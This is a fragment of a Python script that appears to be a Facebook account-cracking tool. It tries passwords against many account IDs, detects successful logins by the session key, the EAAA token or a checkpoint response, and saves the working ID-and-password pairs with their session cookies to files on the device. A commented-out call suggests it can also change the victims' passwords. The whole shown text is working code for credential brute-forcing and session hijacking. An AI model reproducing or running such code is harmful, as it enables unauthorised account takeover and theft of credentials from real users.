                    open('/sdcard/ok_withcookie.txt', 'a').write(ids+'|'+pas+' '+cokeii+'\n')
                    open('/sdcard/HAM-ok.txt', 'a').write(ids+'|'+pas+'\n')
                    oks.append(ids)
                 #   chnge(cokeii,pas,n_pas)
                    break
            elif "session_key" in post.text:
                    cid = str(q['uid'])
                    print('\r\r\033[1;32m [OK-HAM] '+cid+' | '+pas+'\033[1;97m')
                    cokei = ";".join(i["name"]+"="+i["value"] for i in post.json()["session_cookies"])
                    sb = base64.b64encode(os.urandom(18)).decode().replace("/","-").replace("+","_").replace("=","")
                    cokeii = f"sb={sb};{cokei}"
                    #print(' [ cookie: ] '+cokeii)
                    open('/sdcard/ok_withcookie.txt', 'a').write(ids+'|'+pas+' '+cokeii+'\n')
                    open('/sdcard/HAM-ok.txt', 'a').write(ids+'|'+pas+'\n')
                    oks.append(cid)
#                    chnge(cokeii,pas,n_pas)
                    break
            elif "session_key" in q:
                    cid = str(q['uid'])
                    print('\r\r\033[1;32m [OK-HAM] '+cid+' | '+pas+'\033[1;97m')
                    cokei = ";".join(i["name"]+"="+i["value"] for i in post.json()["session_cookies"])
                    sb = base64.b64encode(os.urandom(18)).decode().replace("/","-").replace("+","_").replace("=","")
                    cokeii = f"sb={sb};{cokei}"
                    #print(' [ cookie: ] '+cokeii)
                    open('/sdcard/ok_withcookie.txt', 'a').write(ids+'|'+pas+' '+cokeii+'\n')
                    open('/sdcard/HAM-ok.txt', 'a').write(ids+'|'+pas+'\n')
                    oks.append(cid)
#                    chnge(cokeii,pas,n_pas)
                    break
            elif "EAAA" in post.text:
                    cid = str(q['uid'])
                    print('\r\r\033[1;32m [OK-HAM] '+cid+' | '+pas+'\033[1;97m')
                    cokei = ";".join(i["name"]+"="+i["value"] for i in post.json()["session_cookies"])
                    sb = base64.b64encode(os.urandom(18)).decode().replace("/","-").replace("+","_").replace("=","")
                    cokeii = f"sb={sb};{cokei}"
                    #print(' [ cookie: ] '+cokeii)
                    open('/sdcard/ok_withcookie.txt', 'a').write(ids+'|'+pas+' '+cokeii+'\n')
                    open('/sdcard/HAM-ok.txt', 'a').write(ids+'|'+pas+'\n')
                    oks.append(cid)
#                    chnge(cokeii,pas,n_pas)
                    break
            elif 'checkpoint' in post.text:
                    print('\r\r\033[1;33m [CP-HAM] '+ids+' | '+pas+'\033[1;97m')
                    open('/sdcard/HAM-cp.txt','a').write(ids+'|'+pas+'\n')
                    cps.append(ids)
            else:
                continue
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(10)
    except Exception as e:
        print(e)

approval()
